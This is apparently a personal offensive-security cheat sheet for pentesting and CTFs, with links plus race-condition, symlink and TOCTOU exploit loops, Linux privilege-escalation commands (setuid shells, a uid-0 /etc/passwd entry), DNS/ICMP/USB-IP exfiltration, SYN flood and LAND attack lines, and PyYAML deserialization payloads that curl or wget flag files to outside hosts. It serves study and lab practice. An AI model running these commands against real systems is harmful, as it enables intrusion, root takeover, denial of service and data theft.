# +

- [fuzzing](./fuzzing.md)
- [osint](osint.md)

- https://book.hacktricks.xyz/pentesting-methodology
- http://bitvijays.github.io/LFC-VulnerableMachines.html
- https://fortyseven.github.io/ctfpanel/
- https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
- https://snovvcrash.rocks/cheatsheets/
- https://hausec.com/pentesting-cheatsheet/
- https://www.malwarearchaeology.com/cheat-sheets
- https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html

- https://github.com/adon90/pentest_compilation
- https://github.com/Orange-Cyberdefense/arsenal
- https://github.com/kyawthiha7/pentest-methodology
- https://github.com/enaqx/awesome-pentest
- https://prune2000.github.io/tools/pentest/

- http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
    - http://www.vulnerabilityassessment.co.uk/Framework.png
- https://www.isecom.org/OSSTMM.3.pdf
- http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
- https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Building_A_Lab.md

# vulnerability databases

```
$name enumeration
$name $version exploit
```

- [Exploit Database \- Exploits for Penetration Testers, Researchers, and Ethical Hackers](https://www.exploit-db.com/)
- [Shodan Exploits](https://exploits.shodan.io/)
- [CVE security vulnerability database\. Security vulnerabilities, exploits, references and more](https://www.cvedetails.com/)
- [国家信息安全漏洞库](http://www.cnnvd.org.cn/web/vulnerability/queryLds.tag)
- [Vulncode\-DB](https://www.vulncode-db.com/)
- [Exploit Files \- Packet Storm](https://packetstormsecurity.com/files/tags/exploit)
- [Vulners \- Vulnerability Data Base](https://vulners.com/search)
- [💀 Sploitus \| Exploit & Hacktool Search Engine](https://sploitus.com/)
- [Snyk \- Open Source Security](https://snyk.io/vuln/)
- [huntr: Fix Security Vulnerabilities in Open Source Code](https://www.huntr.dev/bounties/)
- [SG TCP/IP Ports Database](https://www.speedguide.net/ports.php)

- [GitHub \- rudrapwn/source\-code\-review: Blogs, Tools and other available resources for source code review\.](https://github.com/rudrapwn/source-code-review)

```bash
# https://github.com/offensive-security/exploitdb.git
searchsploit afd windows local
searchsploit -t oracle windows
searchsploit -p 39446
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
searchsploit -s Apache Struts 2.0.0
searchsploit linux reverse password
searchsploit -j 55555 | json_pp

msfconsole

# Given exploit with available metasploit module
msf > search $regex

# || manual
cp /usr/share/exploitdb/exploits/linux/remote/42084.rb /root/.msf4/modules/exploits/linux/remote/
msf > use exploit/linux/remote/42084

# configure
# - https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
# - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-Metasploit-module-appropriately
msf > show options
msf > set FOO 123
```

# security feeds

- https://nvd.nist.gov/download/nvd-rss.xml
- https://www.cisa.gov/uscert/mailing-lists-and-feeds
- https://rss.packetstormsecurity.com/files/
- https://seclists.org/rss/fulldisclosure.rss

# racing, race-condition

- [Temmo's Tiny Shop - 0CTF 2017](https://www.40huo.cn/blog/0ctf-2017-writeup.html)
    ```bash
    username=
    password=
    cookie1="PHPSESSID=3k21rt4acut215r1adlrq5m0p0"
    cookie2="PHPSESSID=ck8pgb52nkkb8sdg2c95ms7s16"
    url="http://202.120.7.197/app.php"

    curl "$url?action=login" -b $cookie1 -d "username=$username&pwd=$password" &
    curl "$url?action=login" -b $cookie2 -d "username=$username&pwd=$password"

    curl "$url?action=buy&id=1" -b $cookie1

    curl "$url?action=sale&id=1" -b $cookie1 &
    curl "$url?action=sale&id=1" -b $cookie2
    ```

- https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#-chain-race
    - ~/share/ctf/darkctf2020/chain-race/

- [Exploiting Race Conditions with strace &\#8211; Mike Salvatore&\#039;s Blog](https://salvatoresecurity.com/exploiting-race-conditions-with-strace/)
    - [chown: race condition with \-\-recursive \-L](https://lists.gnu.org/archive/html/coreutils/2017-12/msg00045.html)
    ```bash
    # Terminal 1 (root)
    sudo mkdir -p /var/www/chown-test && cd /var/www
    sudo mkdir chown-test/foo
    sudo mkdir chown-test/bar
    sudo ln -s ../bar chown-test/foo/quux
    sudo touch chown-test/bar/baz
    
    # Terminal 2 (testuser)
    cd /var/www/chown-test/bar
    while true; do ln -s -f /etc/passwd ./baz; done;
    
    # Terminal 1 (root)
    sudo strace -o /dev/null -e inject=fchownat:delay_exit=1000000 chown --recursive --verbose -L testuser chown-test
    ls -l /etc/passwd
    # Output:
    # -rw-r--r-- 1 testuser root 1.5K 2017-12-17 18:34 /etc/passwd
    ```

### TOCTOU

```bash
while true; do
    dd if=/dev/urandom count=$((1024 * 20)) bs=1024 > bigfile
    chmod 777 bigfile
    /exploitable bigfile &
    ln -sf /root/flag.txt bigfile
    sleep 0.1
    rm -f bigfile
done
```

- https://github.com/kahla-sec/CTF-Writeups/blob/master/DarkCTF2020/McQueen.md

### symlink

- [Book \- HackThebox | Samir Ettali](https://samirettali.com/writeups/hackthebox/book/)
    - https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition
        ```bash
        # logrotate: stat /tmp/logs/file.log
        # attacker:
        mv /tmp/logs /tmp/logs2
        ln -s /etc/bash_completion.d /tmp/logs
        # logrotate: create+chown /tmp/logs/file.log
        # attacker:
        echo 'payload' > /tmp/logs/file.log
        # On root login, payload executed
        ```

# priviledge escalation

- https://gtfobins.github.io
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://book.hacktricks.xyz/linux-unix/privilege-escalation
- http://www.fuzzysecurity.com/tutorials/16.html
- https://guif.re/windowseop
- https://guif.re/linuxeop
- https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/

- busybox - act as arbitrary file
    ```bash
    # if owner of file, can use chmod to fix permissions
    upx -o /tmp/chmod /bin/busybox
    # || tar
    # || /lib/ld-musl-x86_64.so.1 /bin/busybox cat
    # || setpriv /bin/busybox cat
    ```

- root owned + bad permissions (e.g. 777)
    - if shared library, compile our own, given called function "foo":
        ```c
        #include <stdlib.h>
        void foo() {
            system("/bin/sh");
        }
        ```
        ```bash
        gcc vuln.c -shared -o vuln.so
        ```

### enumeration

- [GitHub \- Tib3rius/AutoRecon: AutoRecon is a multi\-threaded network reconnaissance tool which performs automated enumeration of services\.](https://github.com/Tib3rius/AutoRecon)
- windows
    - [GitHub \- GhostPack/Seatbelt: Seatbelt is a C\# project that performs a number of security oriented host\-survey &quot;safety checks&quot; relevant from both offensive and defensive security perspectives\.](https://github.com/GhostPack/Seatbelt)
    - [GitHub \- gpoguy/GetVulnerableGPO: PowerShell script to find &\#39;vulnerable&\#39; security\-related GPOs that should be hardended](https://github.com/gpoguy/GetVulnerableGPO)
- linux
    - ~/opt/privilege-escalation-awesome-scripts-suite/
    - ~/opt/LinEnum/
    - [GitHub \- TH3xACE/SUDO\_KILLER: A tool to identify and exploit sudo rules&\#39; misconfigurations and vulnerabilities within sudo for linux privilege escalation\.](https://github.com/TH3xACE/SUDO_KILLER)
    - [GitHub \- DominicBreuker/pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy)
    - https://www.sandflysecurity.com/linux-compromise-detection-command-cheatsheet.pdf

```bash
sudo -l
# ||
cat /etc/sudoers
# || try with `sudo -u`

# specific uid
find / -uid 1001 -type f 2>/dev/null

# suid
find / -perm -u=s -type f 2>/dev/null
```

### setuid

- https://khaoticdev.net/hack-the-box-dynstr/
    ```bash
    # Given: `cp * ./foo/` executed by `sudo ./foo.sh`
    cp /bin/bash .
    chmod +s ./bash
    touch '--preserve=mode'
    sudo ./foo.sh
    ./foo/bash -p  # preserves setuid
    ```

### crypt

- `/etc/shadow`:
    - hash algorithm `$1` = MD5
- `/etc/passwd`:
    - password field
        - empty: `user1::.....`
        - disabled: `user1:*:.....`
        - in `/etc/shadow`: `user1:x:.....`
    ```bash
    # Given pass `foo` encrypted as `aaKNIEDOaueR6`
    perl -le 'print crypt("foo", "aa")'
    # || Encrypt with random salt
    openssl passwd foo

    echo "root2:aaKNIEDOaueR6:0:0:root:/root:/bin/sh" >> /etc/passwd
    su - root2
    ```
- `/etc/sudoers`
    - `foo ALL=(ALL) ALL`
    - `foo ALL=(ALL) NOPASSWD`

- https://en.wikipedia.org/wiki/Crypt_(C)#Key_derivation_functions_supported_by_crypt
- https://man7.org/linux/man-pages/man3/crypt.3.html
- https://man7.org/linux/man-pages/man5/passwd.5.html
    - https://man7.org/linux/man-pages/man8/pwconv.8.html

### pocs

- [The Dirty Pipe Vulnerability &\#8212; The Dirty Pipe Vulnerability  documentation](https://dirtypipe.cm4all.com/)
    - gt 5.8, lt 5.16.11, 5.15.25, 5.10.102
    - ~/code/src/pocs/dirtypipe/exp.c
- [Dirty COW \(CVE\-2016\-5195\)](https://dirtycow.ninja/)
    - gt 2.6.22, lt 4.8.3, 4.7.9, 4.4.26
    - ~/code/src/pocs/dirtycow/dirty.c
        - ~/code/src/pocs/cowroot.c
- [Linux Kernel 2\.4\.x/2\.6\.x \(CentOS 4\.8/5\.3 / RHEL 4\.8/5\.3 / SuSE 10 SP2/11 / Ubuntu 8\.10\) \(PPC\) \- &\#039;sock\_sendpage\(\)&\#039; Local Privilege Escalation \- Linux local Exploit](https://www.exploit-db.com/exploits/9545)
- [Linux Kernel 2\.6 &lt; 2\.6\.19 \(White Box 4 / CentOS 4\.4/4\.5 / Fedora Core 4/5/6 x86\) \- &\#039;ip\_append\_data\(\)&\#039; Ring0 Privilege Escalation \(1\) \- Linux\_x86 local Exploit](https://www.exploit-db.com/exploits/9542)

- https://appdome.github.io/2017/11/23/towelroot.html
- https://github.com/SecWiki/linux-kernel-exploits/tree/master/2014/CVE-2014-3153
- https://github.com/ShotokanZH/Pa-th-zuzu

- https://github.com/lucyoa/kernel-exploits
- https://github.com/SecWiki/linux-kernel-exploits
- https://github.com/SecWiki/windows-kernel-exploits

# remote code execution (RCE)

- ODBC
    - https://medium.com/@kyprizel/why-keep-you-zoo-doors-closed-7c1760d5b2b0
    ```sql
    -- Given: .odbc.ini
    -- [lalala]
    -- Driver=/var/lib/clickhouse/user_files/test.so
    SELECT * FROM odbc('DSN=lalala', 'test', 'test');
    ```
- [Hacking with Environment Variables](https://www.elttam.com/blog/env/)

# process name

- [GitHub \- dvarrazzo/py\-setproctitle: A Python module to customize the process title](https://github.com/dvarrazzo/py-setproctitle)
    - linux: prctl(PR_SET_NAME, "foo")
    - postgres: moves environ when clobbering argv
        - https://github.com/dvarrazzo/py-setproctitle/blob/b6befd449bc0c35c3971f9910ecc195aa68e08ab/src/spt_status.c

# process pseudo-filesystem

- /proc/self/cmdline
- /proc/self/cwd
- /proc/self/environ
- /proc/self/exe
- /proc/self/maps
   - [!] zero size, but sequentially readable (e.g. `cat`, http request with header `Range: bytes 0-4096`)

# data exfiltration

- DNS
    - https://www.aldeid.com/wiki/File-transfer-via-DNS
        ```bash
        # 1. server
        sudo tcpdump -i eth1 -s0 -w loremipsum.pcap 'port 53 and host 192.168.1.29'
        # 2. client
        for b in `cat loremipsum.hex`; do dig @192.168.1.23 $b.fakednsrequest.com; done
        # 3. server
        tcpdump -n -r loremipsum.pcap 'host 192.168.1.29 and host 192.168.1.23' \
            | grep fakednsrequest \
            | cut -d ' ' -f 8 \
            | cut -d '.' -f 1 \
            | uniq \
            | xxd -r -p > loremipsum.txt
        ```
    - [GitHub \- yarrick/iodine: Official git repo for iodine dns tunnel](https://github.com/yarrick/iodine)
    - [GitHub \- leonjza/dnsfilexfer: File transfer via DNS](https://github.com/leonjza/dnsfilexfer)
    - [GitHub \- vp777/procrustes: A bash script that automates the exfiltration of data over dns in case we have blind command execution on a server with egress filtering](https://github.com/vp777/DNS-data-exfiltration)
    - [GitHub \- coryschwartz/dns\_exfiltration: Simple DNS exfiltration using base64\-encoded URL&\#39;s](https://github.com/coryschwartz/dns_exfiltration)
    - [hinty.io \- devforth \- DNS exfiltration of data: step\-by\-step simple guide](https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simple-guide/)
- TCP
    ```bash
    # ICMP (using file contents)
    hping3 -E foo.txt -1 -u -i 10 -d 1.2.3.4 95
    # TCP ACK (using file contents)
    hping3 -E foo.txt -A 1.2.3.4
    # SYN flood
    hping3 -V -c 1000 -d 100 -p 8080 -S -- flood 1.2.3.4
    # LAND attack
    hping3 -V -c 1000 -d 100 -p 8080 -s 18080 -S -k -a 1.2.3.4 1.2.3.4
    ```
    ```ps1
    # https://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-20e5e9c1ed8e
    C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe /out:C:\\temp\\foo /uri:https://foo?$data
    ```
- ARP
    - [GitHub \- nocommentlab/ARPExfiltrator: Data exfiltration over ARP request covert channel](https://github.com/nocommentlab/ARPExfiltrator)
    - [GitHub \- kognise/arpchat: Answering the question nobody asked: what if you wanted to text your friends using only ARP?](https://github.com/kognise/arpchat)
- URI scheme
    - file, ftp, zlib, data, glob, phar, ssh2, rar, ogg, ftps, compress.zlib, compress.bzip2, zip
- bypass URL access rules with redirections (responses with code 3xx)
    - repeat parameter containing url to visit: 2nd url redirects to 3rd url
    ```php
    <?php
    header('HTTP/1.1 301 Redirect');
    header('Location: php://filter/string.toupper/resource=index.php');
    ?>
    ```
- USB over IP
    - [CTFtime\.org / CyberSecurityRumble CTF / EZExfil / Writeup](https://ctftime.org/writeup/24786)
    ```bash
    # On localhost:
    # Given "GatewayPorts yes" enabled in $vps_host sshd_config
    ssh $user@$vps_host -R 3240:localhost:3240

    # On $vps_host:
    sudo modprobe usbip-host
    sudo modprobe usbip-core
    sudo usbipd -D
    sudo usbip list -l # Take bus id of second keyboard = 1-7
    sudo usbip --debug bind -b 1-7

    # On $vulnerable_host:
    # Given TTY of connected user = ttyS0
    /sbin/usbip attach -r $vps_host -b 1-7 &
    cat /dev/ttyS0

    # On $vps_host:
    cat flag.txt > /dev/ttyS0
    ```
- TLS SNI field
    - https://www.mnemonic.no/blog/introducing-snicat/
- Remote desktop
    - base64 typed with AutoHotkey
    - qr codes / 3 bit pixels
        - https://www.pentestpartners.com/security-blog/exfiltration-by-encoding-data-in-pixel-colour-values/

# encodings

### binary-to-text

- public keys - JWK
    - [RFC 7518 \- JSON Web Algorithms \(JWA\)](https://tools.ietf.org/html/rfc7518#page-30)
- https://en.wikipedia.org/wiki/Category:Binary-to-text_encoding_formats

### base64

- 4 char block = 3 char message
    ```bash
    echo 00 | xxd -r -p | base64
    # AA==
    echo 0000 | xxd -r -p | base64
    # AAA=
    echo 000000 | xxd -r -p | base64
    # AAAA
    echo 4141 | xxd -r -p | base64
    # QUE=
    echo 41 | xxd -r -p | base64
    # QQ==
    echo 4141 | xxd -r -p | base64
    # QUE=
    echo 414141 | xxd -r -p | base64
    # QUFB
    ```
- URL payloads: base64url
    - `s/+/-/g; s/\//_/g`
    - [RFC 4648 \- The Base16, Base32, and Base64 Data Encodings \- Base 64 Encoding with URL and Filename Safe Alphabet](https://tools.ietf.org/html/rfc4648#page-7)
- Search encoded content using all possible 3 byte offsets
    - [Lee Holmes \| Searching for Content in Base\-64 Strings](https://www.leeholmes.com/searching-for-content-in-base-64-strings/)
- Multiple encodings of same data using variable paddings
    - [Encoding Mutations: A Base64 Case Study](https://n0.lol/encmute/)
    - [GitHub \- netspooky/b64mute: Base64 Mutator](https://github.com/netspooky/b64mute)

### unicode

- hostnames
    - https://en.wikipedia.org/wiki/Punycode
- replacement character - replace an unknown, unrecognized or unrepresentable character
    - `\xEF\xBF\xBD = U+FFFD = �`
    - https://en.wikipedia.org/wiki/Specials_%28Unicode_block%29

### morse

> The Morse code consists of several "dot", "dash" and "interval". The ratio of "dot" and "dash" is 1:3, The ratio of "intra-code interval", "inter-code interval" and "code group interval" is 1:3:5
    - ~/Downloads/Morse Recognition Algorithm Based on K-means.pdf
- "dot" = ".", "dash" = "-", "intra-code interval" = " ", "inter-code interval" = " ", "code group interval" = "/"
- https://morsecode.world/international/timing.html

# signal decoding

- sound of keystrokes to keys
    - https://www.xil.se/post/sharifctf-2016-misc-sound-rspkt/
- digital radio transmission decoder
    - https://github.com/EliasOenal/multimon-ng

# yaml

- PyYAML yaml.load()
    - https://imcmy.me/hitcon-ctf-2016-writeup-archive/
        ```yaml
        some_option: !!python/object/apply:os.system ["cat flag.txt"]`
        # ||
        some_option: !!python/object/apply:subprocess.call
          args: [wget foo.com/"$(cat flag)"]
          kwds: {shell: true}
        ```
    - https://hackmd.io/@harrier/uiuctf20
        - https://github.com/yaml/pyyaml/pull/386
        - https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1
        ```yaml
        !!python/object/new:type
          args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
          listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt')"
        ```
